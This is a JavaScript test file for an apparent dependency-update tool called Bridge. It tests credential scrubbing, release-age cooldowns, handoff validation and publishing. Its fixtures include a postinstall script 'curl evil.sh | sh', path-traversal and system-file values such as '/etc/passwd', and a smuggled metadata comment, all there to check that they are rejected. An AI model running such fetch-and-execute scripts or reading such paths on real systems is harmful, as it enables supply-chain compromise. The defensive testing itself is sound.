import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import crypto from 'node:crypto';
import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import test from 'node:test';

import {
  checkReleaseAgeCooldown,
  compareVersions,
  matchesCooldownExclude,
  resolveNativeCooldown,
  summarizeCooldownResults
} from '../src/core/cooldown.js';
import {
  buildUntrustedEnv,
  configureUntrustedEnv,
  runCommand
} from '../src/core/executor.js';
import {
  findNonDependencyManifestChanges,
  readHandoffBundle,
  validateBranchName,
  validateHandoffPath,
  writeHandoffBundle,
  writeHandoffOutcome
} from '../src/core/handoff.js';
import { obtainGitHubToken, resolveCloudSettings, uploadRunReport } from '../src/core/cloud.js';
import { detectValidationScripts } from '../src/core/detector.js';
import { buildPullRequestBody } from '../src/core/pullRequest.js';
import { publishCommand } from '../src/commands/publish.js';

const NOW = Date.parse('2026-11-19T12:00:00Z');

function jsonResponse(body, status = 200) {
  return new Response(JSON.stringify(body), {
    status,
    headers: { 'content-type': 'application/json' }
  });
}

async function tempDir(prefix) {
  return fs.mkdtemp(path.join(os.tmpdir(), prefix));
}

function git(cwd, ...args) {
  return execFileSync('git', args, {
    cwd,
    encoding: 'utf8',
    env: {
      ...process.env,
      GIT_AUTHOR_NAME: 'Dev',
      GIT_AUTHOR_EMAIL: 'dev@example.com',
      GIT_COMMITTER_NAME: 'Dev',
      GIT_COMMITTER_EMAIL: 'dev@example.com'
    }
  }).trim();
}

// ---------------------------------------------------------------------------
// Credential scrubbing

test('untrusted commands never see GitHub, Actions OIDC or Bridge tokens', async () => {
  const env = {
    PATH: process.env.PATH,
    HOME: process.env.HOME,
    GH_TOKEN: 'gh-secret',
    GITHUB_TOKEN: 'github-secret',
    ACTIONS_ID_TOKEN_REQUEST_TOKEN: 'oidc-secret',
    ACTIONS_ID_TOKEN_REQUEST_URL: 'https://example.invalid',
    BRIDGE_API_TOKEN: 'brk_secret',
    BRIDGE_GITHUB_TOKEN: 'bot-secret',
    NODE_AUTH_TOKEN: 'registry-token',
    NPM_TOKEN: 'npm-token'
  };
  const scrubbed = buildUntrustedEnv(env);

  for (const name of [
    'GH_TOKEN',
    'GITHUB_TOKEN',
    'ACTIONS_ID_TOKEN_REQUEST_TOKEN',
    'ACTIONS_ID_TOKEN_REQUEST_URL',
    'BRIDGE_API_TOKEN',
    'BRIDGE_GITHUB_TOKEN'
  ]) {
    assert.equal(scrubbed[name], undefined, `${name} should be removed`);
  }

  // Registry credentials stay: installs from private registries need them.
  assert.equal(scrubbed.NODE_AUTH_TOKEN, 'registry-token');
  assert.equal(scrubbed.NPM_TOKEN, 'npm-token');

  const untrusted = await runCommand('node -e "process.stdout.write(String(process.env.GH_TOKEN))"', {
    env
  });
  assert.equal(untrusted.stdout, 'undefined');

  const trusted = await runCommand('node -e "process.stdout.write(String(process.env.GH_TOKEN))"', {
    env,
    trusted: true
  });
  assert.equal(trusted.stdout, 'gh-secret');
});

test('env.allow opts a variable back in for package scripts', () => {
  configureUntrustedEnv({ allow: ['github_token'] });

  try {
    const scrubbed = buildUntrustedEnv({ GITHUB_TOKEN: 'x', GH_TOKEN: 'y' });
    assert.equal(scrubbed.GITHUB_TOKEN, 'x');
    assert.equal(scrubbed.GH_TOKEN, undefined);
  } finally {
    configureUntrustedEnv({ allow: [] });
  }
});

// ---------------------------------------------------------------------------
// Release-age cooldown

test('cooldown helpers compare versions and match exclude patterns', () => {
  assert.equal(compareVersions('11.10.0', '11.9.9'), 1);
  assert.equal(compareVersions('10.9.4', '11.10.0'), -1);
  assert.equal(compareVersions('4.10.0', '4.10.0'), 0);
  assert.equal(matchesCooldownExclude('@acme/ui', ['@acme/*']), true);
  assert.equal(matchesCooldownExclude('react', ['@acme/*', 'react-dom']), false);
  assert.equal(matchesCooldownExclude('react-dom', ['react-dom']), true);
});

test('native cooldown is applied only on supporting versions and never over a repo setting', async () => {
  const dir = await tempDir('bridge-native-');

  const npmNew = await resolveNativeCooldown({
    packageManager: 'npm',
    days: 3,
    scopeDir: dir,
    env: {},
    versionFn: async () => '11.12.0'
  });
  assert.equal(npmNew.applied, true);
  assert.deepEqual(npmNew.env, { npm_config_min_release_age: '3' });

  const npmOld = await resolveNativeCooldown({
    packageManager: 'npm',
    days: 3,
    scopeDir: dir,
    env: {},
    versionFn: async () => '10.9.4'
  });
  assert.equal(npmOld.applied, false);
  assert.deepEqual(npmOld.env, {});
  assert.match(npmOld.reason, /predates/);

  const pnpm = await resolveNativeCooldown({
    packageManager: 'pnpm',
    days: 3,
    scopeDir: dir,
    env: {},
    versionFn: async () => '10.20.0'
  });
  assert.equal(pnpm.env.PNPM_CONFIG_MINIMUM_RELEASE_AGE, '4320');

  const yarn = await resolveNativeCooldown({
    packageManager: 'yarn',
    days: 1,
    scopeDir: dir,
    env: {},
    versionFn: async () => '4.12.0'
  });
  assert.equal(yarn.env.YARN_NPM_MINIMAL_AGE_GATE, '1440');

  await fs.writeFile(path.join(dir, '.npmrc'), 'min-release-age=7\n');
  const respected = await resolveNativeCooldown({
    packageManager: 'npm',
    days: 3,
    scopeDir: dir,
    env: {},
    versionFn: async () => '11.12.0'
  });
  assert.equal(respected.applied, false);
  assert.match(respected.reason, /\.npmrc/);

  const off = await resolveNativeCooldown({ packageManager: 'npm', days: 0, scopeDir: dir });
  assert.equal(off.applied, false);
});

test('release-age gate flags versions published inside the cooldown window', async () => {
  const requests = [];
  const fetchImpl = async (url) => {
    requests.push(String(url));

    if (String(url).endsWith('/axios')) {
      return jsonResponse({
        time: {
          '1.13.0': '2026-10-01T00:00:00Z',
          '1.14.1': '2026-11-19T07:00:00Z'
        }
      });
    }

    if (String(url).endsWith('/@scope%2Futil')) {
      return jsonResponse({ time: { '2.0.1': '2026-11-01T00:00:00Z' } });
    }

    if (String(url).endsWith('/@acme%2Fprivate')) {
      return jsonResponse({ error: 'not found' }, 404);
    }

    if (String(url).includes('pypi.org/pypi/requests/2.32.5/json')) {
      return jsonResponse({ urls: [{ upload_time_iso_8601: '2026-11-18T23:00:00Z' }] });
    }

    return jsonResponse({}, 500);
  };

  const npmResult = await checkReleaseAgeCooldown({
    deltas: [
      { name: 'axios', from: '1.13.0', to: '1.14.1', bump: 'patch', kind: 'direct', dependencyPath: 'node_modules/axios' },
      { name: '@scope/util', from: '2.0.0', to: '2.0.1', bump: 'patch', kind: 'transitive', dependencyPath: 'node_modules/@scope/util' },
      { name: '@acme/private', from: '1.0.0', to: '1.0.1', bump: 'patch', kind: 'direct', dependencyPath: 'node_modules/@acme/private' },
      { name: 'my-workspace', from: '1.0.0', to: '1.0.1', bump: 'patch', kind: 'direct', dependencyPath: 'packages/my-workspace' },
      { name: 'left-pad', from: '1.0.0', to: null, bump: 'removed', kind: 'transitive' },
      { name: '@internal/thing', from: '1.0.0', to: '1.1.0', bump: 'minor', kind: 'direct', dependencyPath: 'node_modules/@internal/thing' }
    ],
    lockfileFormat: 'json-npm',
    days: 3,
    exclude: ['@internal/*'],
    now: NOW,
    fetchImpl
  });

  assert.equal(npmResult.checked, 2);
  assert.equal(npmResult.passed, 1);
  assert.equal(npmResult.violations.length, 1);
  assert.equal(npmResult.violations[0].name, 'axios');
  assert.equal(npmResult.violations[0].ageHours, 5);
  assert.equal(npmResult.violations[0].eligibleAt, '2026-11-22T07:00:00.000Z');
  assert.equal(npmResult.unverified.length, 1);
  assert.match(npmResult.unverified[0].reason, /private package/);
  assert.deepEqual(npmResult.excluded, [{ name: '@internal/thing', version: '1.1.0' }]);
  assert.ok(!requests.some((url) => url.includes('my-workspace')), 'workspace packages are skipped');

  const pypiResult = await checkReleaseAgeCooldown({
    deltas: [{ name: 'requests', from: '2.32.4', to: '2.32.5', bump: 'patch', kind: 'direct' }],
    lockfileFormat: 'toml-poetry',
    days: 3,
    now: NOW,
    fetchImpl
  });
  assert.equal(pypiResult.violations.length, 1);

  const summary = summarizeCooldownResults([npmResult, pypiResult]);
  assert.equal(summary.days, 3);
  assert.equal(summary.violations.length, 2);
  assert.equal(summary.checked, 3);
});

test('pull request body shows the cooldown and a run link instead of a local path', () => {
  const body = buildPullRequestBody({
    branchName: 'bridge/patch-2026-11-19',
    baseBranch: 'main',
    dependencySummary: { directChanged: 1, transitiveChanged: 2, byBump: { patch: 3 } },
    runReportPath: '/Users/someone/.bridge/runs/patch-1/bridge-report.v1.json',
    runId: 'patch-1',
    runUrl: 'https://bridge.example.com/runs/patch-1',
    cooldown: { days: 3, checked: 3, unverified: [], excluded: [] }
  });

  assert.match(body, /Release-age cooldown/);
  assert.match(body, /All 3 updated versions were published at least 3 days ago/);
  assert.match(body, /\[patch-1\]\(https:\/\/bridge\.example\.com\/runs\/patch-1\)/);
  assert.doesNotMatch(body, /\/Users\/someone/);
});

// ---------------------------------------------------------------------------
// Handoff bundle

test('handoff paths are limited to dependency manifests and lockfiles', () => {
  assert.equal(validateHandoffPath('package-lock.json'), 'package-lock.json');
  assert.equal(validateHandoffPath('apps/web/package.json'), 'apps/web/package.json');

  for (const bad of [
    '../package.json',
    '/etc/passwd',
    '.github/workflows/ci.yml',
    'src/index.js',
    '.git/config',
    'node_modules/x/package.json',
    'apps/../package.json',
    './package.json',
    'a\\package.json'
  ]) {
    assert.throws(() => validateHandoffPath(bad), /Refusing/, bad);
  }

  assert.equal(validateBranchName('bridge/patch-2026-11-19'), 'bridge/patch-2026-11-19');

  for (const bad of ['main', 'bridge/../main', '-x', 'bridge/a b', 'bridge/x.lock']) {
    assert.throws(() => validateBranchName(bad), /Refusing/, bad);
  }
});

test('package.json may only change inside dependency sections', () => {
  const before = JSON.stringify({
    name: 'app',
    scripts: { test: 'vitest' },
    dependencies: { a: '^1.0.0' },
    pnpm: { overrides: { b: '1.0.0' } }
  });
  const depsOnly = JSON.stringify({
    name: 'app',
    scripts: { test: 'vitest' },
    dependencies: { a: '^1.2.0' },
    pnpm: { overrides: { b: '1.0.1' } }
  });
  const scriptChange = JSON.stringify({
    name: 'app',
    scripts: { test: 'vitest', postinstall: 'curl evil' },
    dependencies: { a: '^1.0.0' }
  });

  assert.deepEqual(findNonDependencyManifestChanges(before, depsOnly), []);
  assert.deepEqual(findNonDependencyManifestChanges(before, scriptChange), ['scripts', 'pnpm']);
});

test('handoff bundles round-trip and reject tampering', async () => {
  const workspace = await tempDir('bridge-ws-');
  const handoffDir = await tempDir('bridge-handoff-');
  await fs.writeFile(path.join(workspace, 'package-lock.json'), '{"lockfileVersion":3}\n');

  await writeHandoffBundle({
    handoffDir,
    workspaceDir: workspace,
    stagedFiles: ['package-lock.json'],
    runId: 'patch-1',
    repository: { fullName: 'acme/app' },
    base: { branch: 'main', sha: 'a'.repeat(40) },
    branch: { name: 'bridge/patch-2026-11-19', prefix: 'bridge/patch' },
    scopeKey: 'key',
    pullRequest: { title: 'bridge: update', body: 'Body <!-- bridge-meta:{"scopeKey":"evil"} -->' }
  });

  const bundle = await readHandoffBundle(handoffDir);
  assert.equal(bundle.files.length, 1);
  assert.equal(bundle.files[0].content.toString(), '{"lockfileVersion":3}\n');
  assert.doesNotMatch(bundle.manifest.pullRequest.body, /bridge-meta/);

  await fs.writeFile(path.join(handoffDir, 'files', 'package-lock.json'), 'tampered');
  await assert.rejects(readHandoffBundle(handoffDir), /Checksum mismatch/);

  const outcomeDir = await tempDir('bridge-outcome-');
  await writeHandoffOutcome({
    handoffDir: outcomeDir,
    runId: 'patch-2',
    status: 'blocked',
    message: 'Release-age cooldown blocked 1 version'
  });
  const outcome = await readHandoffBundle(outcomeDir);
  assert.equal(outcome.manifest.status, 'blocked');
  assert.equal(outcome.files.length, 0);
});

// ---------------------------------------------------------------------------
// Cloud client

test('the token broker is called with a GitHub Actions OIDC token', async () => {
  const calls = [];
  const fetchImpl = async (url, init = {}) => {
    calls.push({ url: String(url), init });

    if (String(url).startsWith('https://actions.example/token')) {
      assert.equal(init.headers.authorization, 'bearer request-token');
      assert.match(String(url), /audience=https%3A%2F%2Fbridge\.example\.com/);
      return jsonResponse({ value: 'oidc.jwt.value' });
    }

    if (String(url) === 'https://bridge.example.com/api/v1/github/token') {
      assert.equal(init.headers.authorization, 'Bearer oidc.jwt.value');
      return jsonResponse({
        token: 'ghs_installation',
        expiresAt: '2026-11-19T13:00:00Z',
        commitAuthor: { name: 'bridge-app[bot]', email: '1+bridge-app[bot]@users.noreply.github.com' }
      });
    }

    return jsonResponse({}, 404);
  };
  const settings = resolveCloudSettings({
    BRIDGE_API_URL: 'https://bridge.example.com/',
    ACTIONS_ID_TOKEN_REQUEST_URL: 'https://actions.example/token?api-version=2.0',
    ACTIONS_ID_TOKEN_REQUEST_TOKEN: 'request-token'
  });

  const credentials = await obtainGitHubToken(settings, { repository: 'acme/app', fetchImpl });
  assert.equal(credentials.token, 'ghs_installation');
  assert.equal(credentials.source, 'broker');
  assert.equal(credentials.commitAuthor.name, 'bridge-app[bot]');
  assert.equal(JSON.parse(calls[1].init.body).repository, 'acme/app');

  const upload = await uploadRunReport(
    { ...settings, apiToken: 'brk_test' },
    { run: { id: 'patch-1' } },
    {
      fetchImpl: async (url, init) => {
        assert.equal(String(url), 'https://bridge.example.com/api/v1/runs');
        assert.equal(init.headers.authorization, 'Bearer brk_test');
        return jsonResponse({ id: 1, url: 'https://bridge.example.com/runs/patch-1' }, 201);
      }
    }
  );
  assert.equal(upload.status, 'uploaded');
  assert.equal(upload.url, 'https://bridge.example.com/runs/patch-1');
});

test('publishing without credentials explains what is missing', async () => {
  await assert.rejects(
    obtainGitHubToken(resolveCloudSettings({})),
    /BRIDGE_API_URL|BRIDGE_GITHUB_TOKEN/
  );
  await assert.rejects(
    obtainGitHubToken(resolveCloudSettings({ BRIDGE_API_URL: 'https://bridge.example.com' })),
    /id-token: write/
  );
});

// ---------------------------------------------------------------------------
// bridge init --yes

test('init detects typecheck, lint, test and build scripts', async () => {
  const dir = await tempDir('bridge-init-');
  await fs.writeFile(
    path.join(dir, 'package.json'),
    JSON.stringify({
      scripts: {
        typecheck: 'tsc --noEmit',
        lint: 'eslint .',
        test: 'vitest run',
        'test:watch': 'vitest --watch',
        build: 'vite build',
        dev: 'vite'
      }
    })
  );

  assert.deepEqual(await detectValidationScripts(dir, 'npm'), [
    'npm run typecheck',
    'npm run lint',
    'npm test',
    'npm run build'
  ]);
  assert.deepEqual(await detectValidationScripts(dir, 'pnpm'), [
    'pnpm run typecheck',
    'pnpm run lint',
    'pnpm run test',
    'pnpm run build'
  ]);

  await fs.writeFile(
    path.join(dir, 'package.json'),
    JSON.stringify({ scripts: { test: 'echo "Error: no test specified" && exit 1' } })
  );
  assert.deepEqual(await detectValidationScripts(dir, 'npm'), []);
});

// ---------------------------------------------------------------------------
// bridge publish against a real git remote

async function makeRemoteRepo() {
  const root = await tempDir('bridge-publish-');
  const remote = path.join(root, 'remote.git');
  const seed = path.join(root, 'seed');
  git(root, 'init', '--bare', '--initial-branch=main', remote);
  git(root, 'clone', remote, seed);
  await fs.writeFile(
    path.join(seed, 'package.json'),
    `${JSON.stringify({ name: 'app', scripts: { test: 'node -e 1' }, dependencies: { ms: '^2.1.0' } }, null, 2)}\n`
  );
  await fs.writeFile(
    path.join(seed, 'package-lock.json'),
    `${JSON.stringify({ lockfileVersion: 3, packages: { 'node_modules/ms': { version: '2.1.2' } } }, null, 2)}\n`
  );
  git(seed, 'add', '.');
  git(seed, 'commit', '-m', 'init');
  git(seed, 'push', 'origin', 'main');
  const baseSha = git(seed, 'rev-parse', 'HEAD');
  const checkout = path.join(root, 'checkout');
  git(root, 'clone', remote, checkout);
  return { root, remote, checkout, baseSha };
}

async function makeHandoff({ root, baseSha, lockfile, manifest = null }) {
  const workspace = path.join(root, `ws-${crypto.randomUUID()}`);
  const handoffDir = path.join(root, `handoff-${crypto.randomUUID()}`);
  await fs.mkdir(workspace, { recursive: true });
  const stagedFiles = ['package-lock.json'];
  await fs.writeFile(path.join(workspace, 'package-lock.json'), lockfile);

  if (manifest) {
    await fs.writeFile(path.join(workspace, 'package.json'), manifest);
    stagedFiles.push('package.json');
  }

  await writeHandoffBundle({
    handoffDir,
    workspaceDir: workspace,
    stagedFiles,
    runId: 'patch-1700000000000-1-abc123',
    repository: { fullName: 'acme/app', url: 'https://github.com/acme/app' },
    base: { branch: 'main', sha: baseSha },
    branch: { name: 'bridge/patch-2026-11-19', prefix: 'bridge/patch' },
    scopeKey: 'scope-key',
    pullRequest: { enabled: true, title: '', body: '## Bridge dependency maintenance' },
    summary: { direct: 1, transitive: 0, cooldownDays: 3, cooldownChecked: 1 }
  });
  await fs.writeFile(
    path.join(handoffDir, 'bridge-report.v1.json'),
    JSON.stringify({ schemaVersion: 'bridge-report.v1', run: { id: 'patch-1700000000000-1-abc123', status: 'handoff_ready' }, outcome: {} })
  );
  return handoffDir;
}

test('publish pushes only the validated files as the bot and opens a pull request', async () => {
  const { root, remote, checkout, baseSha } = await makeRemoteRepo();
  const handoffDir = await makeHandoff({
    root,
    baseSha,
    lockfile: `${JSON.stringify({ lockfileVersion: 3, packages: { 'node_modules/ms': { version: '2.1.3' } } }, null, 2)}\n`
  });
  const ghCommands = [];
  const uploads = [];

  const ok = await publishCommand({
    handoffDir,
    cwd: checkout,
    env: { ...process.env, GITHUB_REPOSITORY: 'acme/app', GITHUB_ACTIONS: '', GITHUB_STEP_SUMMARY: path.join(root, 'summary.md') },
    obtainToken: async () => ({
      token: 'ghs_test',
      source: 'broker',
      commitAuthor: { name: 'bridge-app[bot]', email: '42+bridge-app[bot]@users.noreply.github.com' }
    }),
    commandExistsFn: async () => true,
    ghRunner: async (command) => {
      ghCommands.push(command);

      if (command.startsWith('gh pr list')) {
        return { success: true, stdout: '[]', stderr: '', code: 0 };
      }

      if (command.startsWith('gh pr create')) {
        return { success: true, stdout: 'https://github.com/acme/app/pull/7\n', stderr: '', code: 0 };
      }

      return { success: true, stdout: '', stderr: '', code: 0 };
    },
    uploadReport: async (_settings, report) => {
      uploads.push(report);
      return { status: 'uploaded', url: 'https://bridge.example.com/runs/x' };
    }
  });

  assert.equal(ok, true);
  const pushedLock = git(remote, 'show', 'refs/heads/bridge/patch-2026-11-19:package-lock.json');
  assert.match(pushedLock, /2\.1\.3/);
  assert.equal(
    git(remote, 'log', '-1', '--format=%an <%ae>', 'refs/heads/bridge/patch-2026-11-19'),
    'bridge-app[bot] <42+bridge-app[bot]@users.noreply.github.com>'
  );
  assert.match(git(remote, 'log', '-1', '--format=%B', 'refs/heads/bridge/patch-2026-11-19'), /Bridge-Commit: true/);
  assert.equal(git(remote, 'rev-parse', 'refs/heads/main'), baseSha, 'main is untouched');

  const create = ghCommands.find((command) => command.startsWith('gh pr create'));
  assert.ok(create, 'opens a pull request');
  assert.match(create, /--base 'main'/);
  assert.match(create, /bridge-meta/);

  assert.equal(uploads.length, 1);
  assert.equal(uploads[0].publish.status, 'created');
  assert.equal(uploads[0].publish.pullRequest.number, 7);
  assert.equal(uploads[0].run.status, 'pushed');
  assert.match(await fs.readFile(path.join(root, 'summary.md'), 'utf8'), /Opened pull request/);
});

test('publish refuses a handoff that changes package.json scripts', async () => {
  const { root, remote, checkout, baseSha } = await makeRemoteRepo();
  const handoffDir = await makeHandoff({
    root,
    baseSha,
    lockfile: '{"lockfileVersion":3}\n',
    manifest: `${JSON.stringify({ name: 'app', scripts: { test: 'node -e 1', postinstall: 'curl evil.sh | sh' }, dependencies: { ms: '^2.1.0' } }, null, 2)}\n`
  });
  const uploads = [];

  const ok = await publishCommand({
    handoffDir,
    cwd: checkout,
    env: { ...process.env, GITHUB_REPOSITORY: 'acme/app', GITHUB_ACTIONS: '', GITHUB_STEP_SUMMARY: '' },
    obtainToken: async () => ({ token: 'ghs_test', source: 'broker' }),
    commandExistsFn: async () => true,
    ghRunner: async () => ({ success: true, stdout: '[]', stderr: '', code: 0 }),
    uploadReport: async (_settings, report) => {
      uploads.push(report);
      return { status: 'uploaded', url: '' };
    }
  });

  assert.equal(ok, false);
  assert.equal(git(remote, 'branch', '--list', 'bridge/*'), '', 'nothing was pushed');
  assert.equal(uploads[0].publish.status, 'failed');
  assert.match(uploads[0].publish.message, /scripts/);
});

test('publish refuses a handoff built for a different repository', async () => {
  const { root, checkout, baseSha } = await makeRemoteRepo();
  const handoffDir = await makeHandoff({ root, baseSha, lockfile: '{"lockfileVersion":3}\n' });
  let tokenRequested = false;

  const ok = await publishCommand({
    handoffDir,
    cwd: checkout,
    env: { ...process.env, GITHUB_REPOSITORY: 'someone-else/app', GITHUB_ACTIONS: '', GITHUB_STEP_SUMMARY: '' },
    obtainToken: async () => {
      tokenRequested = true;
      return { token: 'x', source: 'broker' };
    },
    uploadReport: async () => ({ status: 'skipped', url: '' })
  });

  assert.equal(ok, false);
  assert.equal(tokenRequested, false, 'no token is requested for a mismatched repository');
});

test('publish records blocked runs without pushing', async () => {
  const { checkout } = await makeRemoteRepo();
  const handoffDir = await tempDir('bridge-blocked-');
  await writeHandoffOutcome({
    handoffDir,
    runId: 'patch-9',
    status: 'blocked',
    message: 'Release-age cooldown (3 days) blocked 1 version',
    gateType: 'cooldown_block'
  });
  await fs.writeFile(
    path.join(handoffDir, 'bridge-report.v1.json'),
    JSON.stringify({ run: { id: 'patch-9', status: 'failed' }, outcome: {} })
  );
  const uploads = [];

  const ok = await publishCommand({
    handoffDir,
    cwd: checkout,
    env: { ...process.env, GITHUB_REPOSITORY: 'acme/app', GITHUB_ACTIONS: '', GITHUB_STEP_SUMMARY: '' },
    obtainToken: async () => {
      throw new Error('should not request a token');
    },
    uploadReport: async (_settings, report) => {
      uploads.push(report);
      return { status: 'uploaded', url: '' };
    }
  });

  assert.equal(ok, true);
  assert.equal(uploads[0].publish.status, 'blocked');
});
